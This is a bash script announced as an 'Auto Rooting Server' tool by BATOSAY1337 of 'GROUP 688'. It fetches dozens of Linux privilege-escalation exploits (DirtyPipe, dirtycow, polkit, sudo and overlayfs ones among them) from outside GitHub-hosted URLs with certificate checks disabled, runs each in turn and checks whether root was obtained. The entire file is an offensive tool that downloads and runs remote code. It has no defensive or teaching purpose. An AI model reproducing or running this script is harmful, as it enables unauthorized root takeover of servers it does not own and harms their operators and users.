#!/bin/bash

RED='\033[91m'
ENDCOLOR='\033[0m'

echo "***************************************************************"
echo -e "${RED}Auto Rooting Server By: BATOSAY1337${ENDCOLOR}"
echo -e "${RED}GROUP : 688${ENDCOLOR}"
echo "***************************************************************"

check_root() {
    if [ "$(id -u)" -eq 0 ]; then
        echo
        echo "[+] Successfully Get Root Access"
        echo "ID     => $(id -u)"
        echo "WHOAMI => $USER"
        echo
        exit
    fi
}

check_pkexec_version() {
    output=$(pkexec --version 2>/dev/null)
    version=""
    while IFS= read -r line; do
        if [[ $line == *"pkexec version"* ]]; then
            version=$(echo "$line" | awk '{print $NF}')
            break
        fi
    done <<< "$output"
    echo "$version"
}

run_if_downloaded() {
    local url="$1"
    local file="$2"
    wget -q "$url" --no-check-certificate
    if [[ -f "$file" ]]; then
        chmod +x "$file"
        ./"$file"
        check_root
        rm -f "$file"
    else
        echo "[!] $file not found, skipping..."
    fi
}

run_commands_with_pkexec() {
    pkexec_version=$(check_pkexec_version)
    echo "pkexec version: $pkexec_version"

    if [[ $pkexec_version == "1.05" || $pkexec_version == "0.96" || $pkexec_version == "0.95" || $pkexec_version == "105" ]]; then
        run_if_downloaded "https://0-gram.github.io/id-0/exp_file_credential" "exp_file_credential"
        rm -rf exp_dir
    else
        echo "[!] pkexec not supported"
    fi
}

run_commands_with_pkexec

# === MULAI EKSPLOIT SECARA BERTAHAP ===

exploit_list=(
    "ak"
    "ptrace"
    "CVE-2022-0847-DirtyPipe-Exploits/exploit-1"
    "CVE-2022-0847-DirtyPipe-Exploits/exploit-2"
    "CVE-2022-0847-DirtyPipe-Exploits/a2.out"
    "sudodirtypipe"
    "af_packet"
    "CVE-2015-1328"
    "cve-2017-16995"
    "exploit-debian"
    "exploit-ubuntu"
    "newpid"
    "raceabrt"
    "timeoutpwn"
    "upstream44"
    "lpe.sh"
    "a.out"
    "linux_sudo_cve-2017-1000367"
    "overlayfs"
    "CVE-2017-7308"
    "CVE-2022-2639"
    "polkit-pwnage"
    "RationalLove"
    "CVE-2011-1485"
    "CVE-2012-0056"
    "CVE-2014-4014"
    "CVE-2016-9793"
    "CVE-2021-3493"
    "CVE-2023-32233"
    "FreeBSD-2005-EDB-ID-1311"
    "chocobo_root"
    "cowroot"
    "dcow"
    "dirtycow"
    "exp"
    "makman"
    "pwn"
    "socat"
    "sudo_pwfeedback"
)

for exploit in "${exploit_list[@]}"; do
    base=$(basename "$exploit")
    run_if_downloaded "https://0-gram.github.io/id-0/$exploit" "$base"
done

# Python exploit
wget -q "https://0-gram.github.io/id-0/exploit_userspec.py" --no-check-certificate
if [[ -f "exploit_userspec.py" ]]; then
    chmod +x exploit_userspec.py
    python2 exploit_userspec.py
    check_root
    rm -f exploit_userspec.py 0 kmem sendfile1
else
    echo "[!] exploit_userspec.py not found"
fi

# Sudo Sandwich
run_if_downloaded "https://raw.githubusercontent.com/CallMeBatosay/Privilege-Escalation/main/sudo-hax-me-a-sandwich" "sudo-hax-me-a-sandwich"
if [[ -f "sudo-hax-me-a-sandwich" ]]; then
    ./sudo-hax-me-a-sandwich 0
    check_root
    ./sudo-hax-me-a-sandwich 1
    check_root
    ./sudo-hax-me-a-sandwich 2
    check_root
    rm -f sudo-hax-me-a-sandwich
fi

# Exploit CVE terbaru
run_if_downloaded "https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh" "exploit.sh"
